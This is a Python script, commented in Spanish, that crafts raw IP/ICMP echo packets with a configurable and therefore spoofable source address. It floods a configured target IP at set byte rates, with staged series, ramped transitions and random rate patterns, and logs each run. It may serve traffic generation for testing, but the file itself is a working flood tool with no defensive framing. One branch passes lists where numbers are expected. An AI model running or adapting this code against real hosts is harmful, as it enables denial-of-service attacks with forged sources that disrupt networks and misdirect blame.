import socket
import struct
import random
import time
import signal
import sys
import configparser
import os
import random
import logging


# Archivo de configuración
CONFIG_FILE = "config.conf"

# Nombre del archivo de log
log_filename = "icmp_flood.log"

# Crear el logger
logger = logging.getLogger()
logger.setLevel(logging.INFO)

# Formato del log
# formatter = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S') -> No quiero que me saque el [INFO]
formatter = logging.Formatter('[%(asctime)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')

# Handler para archivo
file_handler = logging.FileHandler(log_filename)
file_handler.setLevel(logging.INFO)
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

# Handler para consola (terminal)
console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)


# Variable global para controlar si se debe detener el flood
running = True

ICMP_ECHO_REQUEST = 8  # Tipo de mensaje ICMP para solicitud de eco
IP_PROTO_ICMP = 1      # Protocolo ICMP

# Leer configuración desde el archivo
def load_config(file_path):
    config = configparser.ConfigParser()
    config.read(file_path)
    return config['DEFAULT']  # Leer la sección DEFAULT


def signal_handler(sig, frame):
    """ Manejador de señal para SIGINT (Ctrl+C).
    Detener el flood de ICMP de manera segura. """
    
    global running
    print("\nInterrupción detectada. Deteniendo el flood ICMP...")
    running = False  # Establece la variable a False para detener el flood

signal.signal(signal.SIGINT, signal_handler)

def checksum(source_string):
    """
    Calcular la suma de verificación de un paquete.
    """
    sum = 0
    countTo = (len(source_string) // 2) * 2
    count = 0
    while count < countTo:
        thisVal = struct.unpack("!H", source_string[count:count+2])[0]
        sum = sum + thisVal
        sum = sum & 0xFFFFFFFF  # Asegurarse de que sea de 32 bits
        count = count + 2

    if countTo < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xFFFFFFFF

    sum = (sum >> 16) + (sum & 0xFFFF)
    sum = sum + (sum >> 16)
    checksum = ~sum & 0xFFFF
    return checksum

def create_packet(id, source_ip, dest_ip):
    """
    Crear un paquete IP + ICMP.
    """
    # Encabezado IP
    ip_header = struct.pack("!BBHHHBBH4s4s",
                            0x45, 0, 40, 0, 0, 255, IP_PROTO_ICMP,
                            0, socket.inet_aton(source_ip), socket.inet_aton(dest_ip))

    # Crear paquete ICMP
    icmp_header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, 0, id, 1)
    data = bytes([random.randint(0, 255) for _ in range(56)])  # Datos aleatorios (56 bytes)

    # Calculamos el checksum para el ICMP (solo)
    checksum_value = checksum(icmp_header + data)
    icmp_header = struct.pack("bbHHh", ICMP_ECHO_REQUEST, 0, checksum_value, id, 1)

    # Paquete completo
    packet = ip_header + icmp_header + data
    return packet

def flood_icmp_with_connect(source_ip, target_ip, packet_count=1000):
  
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)  # Incluir encabezado IP

    packet_id = random.randint(1, 65535)

    # print(f"Iniciando flood ICMP hacia {target_ip}...")


    count = 0
    while running and count < packet_count:  # Continuar enviando paquetes hasta que se reciba la señal de interrupción
        packet = create_packet(packet_id, source_ip, target_ip)
        print(len(packet))
        try:
            icmp_socket.sendto(packet, (target_ip, 1))  # Enviar paquete ICMP
            count += 1
            # print(f"Paquete {count} enviado a {target_ip}...")
        except Exception as e:
            print(f"Error al enviar paquete: {e}")

    icmp_socket.close()
    # print(f"Flood ICMP detenido. Paquetes enviados: {count}")


def flood_icmp_speed_with_connect(source_ip, target_ip, speed, duration):
  
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    test_packet = create_packet(random.randint(1, 65535), source_ip, target_ip)
    packet_size = len(test_packet)
    delay = 1 / (speed / packet_size)

    # print(f"Iniciando flood ICMP a {speed} Bytes/s durante {duration} segundos...")

    end_time = time.time() + duration
    packet_id = random.randint(1, 65535)
    count = 0
    print(f"[LOG] Se va a emitir a un Bitrate de {(speed/1000):.2f} KBps durante los próximos {duration} s.")

    while running and time.time() < end_time:
        packet = create_packet(packet_id, source_ip, target_ip)
        try:
            count += 1
            icmp_socket.sendto(packet, (target_ip, 1))
            # print(f"Paquete {count} enviado a {target_ip}...")
            time.sleep(delay)

        except Exception as e:
            print(f"Error al enviar paquete: {e}")

    icmp_socket.close()
    # print("Flood ICMP finalizado.")


def flood_icmp_speed(s, source_ip, target_ip, speed, duration):
   

    test_packet = create_packet(random.randint(1, 65535), source_ip, target_ip)
    packet_size = len(test_packet)
    delay = 1 / (speed / packet_size)

    # print(f"Iniciando flood ICMP a {speed} Bytes/s durante {duration} segundos...")

    end_time = time.time() + duration
    packet_id = random.randint(1, 65535)
    count = 0

    logger.info(f"Se va a emitir a un Bitrate de {(speed/1000):.2f} KBps durante los próximos {duration} s.")

    while running and time.time() < end_time:
        packet = create_packet(packet_id, source_ip, target_ip)
        try:
            count += 1
            s.sendto(packet, (target_ip, 1))
            # print(f"Paquete {count} enviado a {target_ip}...")
            time.sleep(delay)

        except Exception as e:
            print(f"Error al enviar paquete: {e}")

    # print("Flood ICMP finalizado.")


def flood_icmp_speed_series(source_ip, target_ip, speed_list, duration_list):
   
    if len(speed_list) != len(duration_list):
        raise ValueError("Las listas de velocidad y duración deben tener el mismo tamaño")
    
    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    for i in range(len(speed_list)):
        speed = speed_list[i]
        duration = duration_list[i]

        # print(f"\n--- Iniciando etapa {i+1} ---")
        # print(f"Enviando paquetes a {speed} Bytes/s durante {duration} segundos")

        flood_icmp_speed(icmp_socket, source_ip, target_ip, speed, duration)

    icmp_socket.close()

    print("\nFlood ICMP finalizado.")


def flood_icmp_speed_series_transition(source_ip, target_ip, speed_list, duration_list, time_transition, num_transition):
    
    if len(speed_list) != len(duration_list):
        raise ValueError("Las listas de velocidad y duración deben tener el mismo tamaño")
    
    duration_incr = time_transition / num_transition # Duracion de cada etapa de transición entre cada Velocidad del Array

    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    for i in range(len(speed_list)):
        speed = speed_list[i]
        duration = duration_list[i]

        # print(f"\n--- Iniciando etapa {i+1} ---")
        # print(f"Enviando paquetes a {speed} Bytes/s durante {duration} segundos")

        flood_icmp_speed(icmp_socket, source_ip, target_ip, speed, duration)

        if i < (len(speed_list) - 1):
            # print("Iniciando etapa de transición de incremento de velocidad")
            speed_next = speed_list[i+1]
            increase_speed = (speed_next - speed) / num_transition
            count = 0
            time_actual = time.time()
            time_end = time_actual + time_transition
            while speed < speed_next:
                count += 1
                speed += increase_speed
                # print(f"\n--- Iniciando etapa de incremento {count} ---")
                # print(f"\nEnviando a {speed} Bytes/s durante {duration_incr} segundos")
                flood_icmp_speed(icmp_socket, source_ip, target_ip, speed, duration_incr)

    icmp_socket.close()
    
    print("\nFlood ICMP finalizado.\n")

def flood_icmp_random(source_ip, target_ip, speed_list, duration_list, time_transition_random, max_size_transition):

    icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

    print(speed_list)
    print(duration_list)

    for i in range(len(speed_list)):
        speed = speed_list[i]
        duration = duration_list[i]

        flood_icmp_speed(icmp_socket, source_ip, target_ip, speed, duration)

        if i < (len(speed_list) - 1):

            speed_next = speed_list[i+1]
            
            # print(f"\n--- Iniciando etapa {i+1} ---")
            # print(f"Tamaño del paquete ARP: {packet_size} bytes")
            # print(f"Enviando paquetes a {speed} Bytes/s durante {duration} segundos con {threads} hilos")

            while(abs(speed_next - speed) > max_size_transition):
                if(speed_next > speed):
                    speed += max_size_transition
                    flood_icmp_speed(icmp_socket, source_ip, target_ip, speed, time_transition_random)
                else: 
                    speed -= max_size_transition
                    flood_icmp_speed(icmp_socket, source_ip, target_ip, speed, time_transition_random)    

    icmp_socket.close()
    
    print("\nFlood ICMP finalizado.")


if __name__ == "__main__":

    if not os.path.exists(CONFIG_FILE):
        print(f"Archivo de configuración '{CONFIG_FILE}' no encontrado.")
        sys.exit(1)

    # LEEMOS EL ARCHIVO CONFIG
    config = load_config(CONFIG_FILE)
    
    # LEEMOS LOS PARÁMETROS DEL ARCHIVO CONFIG
    source_ip = config.get('source_ip')
    target_ip = config.get('target_ip')

    generacion_random = int(config.get('generacion_random_ICMP'))

    if (generacion_random==1):
        num_generaciones = int(config.get('num_generaciones_ICMP'))
        speed_min = int(config.get('speed_min_ICMP'))
        speed_max = int(config.get('speed_max_ICMP'))
        duration_min = int(config.get('duration_min_ICMP'))
        duration_max = int(config.get('duration_max_ICMP'))
        time_transition_random = int(config.get('time_transition_random_ICMP'))
        max_size_transition = int(config.get('max_size_transition_ICMP'))

        speed_list = [random.randint(speed_min, speed_max) for _ in range(num_generaciones)]
        duration_list = [random.randint(duration_min, duration_max) for _ in range(num_generaciones)]

        flood_icmp_random(source_ip, target_ip, speed_list, duration_list, time_transition_random, max_size_transition)


    else:

        speed_list = list(map(int, config.get('speed_list_ICMP').split(','))) # Velocidades en Bytes/s
        duration_list = list(map(int, config.get('duration_list_ICMP').split(',')))  # Duraciones en segundos 
        time_transition = int(config.get('time_transition_ICMP'))
        num_transition = int(config.get('num_transition_ICMP')) 

        if len(speed_list) != len(duration_list):
            print("Tamaño del array speed_list:")
            print(f"len(speed_list) = {len(speed_list)}")
            print("\nTamaño del array duration_list:")
            print(f"len(duration_list) = {len(duration_list)}")
            raise ValueError("\nLas listas de velocidad y duración deben tener el mismo tamaño")
        
        for i in range(len(speed_list)):
            if speed_list[i] <= 0:
                print(f"speed_list[{i}] = {speed_list[i]}")
                raise ValueError("\nLos valores de velocidad de envío (SPEED_LIST) deben ser positivos (mayores que 0)")
            elif duration_list[i] <= 0:
                print(f"duration_list[{i}] = {duration_list[i]}")
                raise ValueError("\nLos valores de duración de envío (DURATION_LIST) deben ser positivos (mayores que 0)")
            
        if len(speed_list) == 1:
            flood_icmp_speed_with_connect(source_ip, target_ip, speed_list, duration_list)
        elif time_transition > 0 and num_transition <= 0:
            print(f"time_transition tiene un valor correcto pero num_transion NO -> num_transition = {num_transition}")
            print("Se ejecutan las series sin transición entre ellas")
            flood_icmp_speed_series(source_ip, target_ip, speed_list, duration_list)
        elif num_transition > 0 and time_transition <= 0:
            print(f"num_transition tiene un valor correcto pero time_transition NO -> time_transition = {time_transition}")
            print("Se ejecutan las series sin transición entre ellas")
            flood_icmp_speed_series(source_ip, target_ip, speed_list, duration_list)
        else:
            flood_icmp_speed_series_transition(source_ip, target_ip, speed_list, duration_list, time_transition, num_transition)




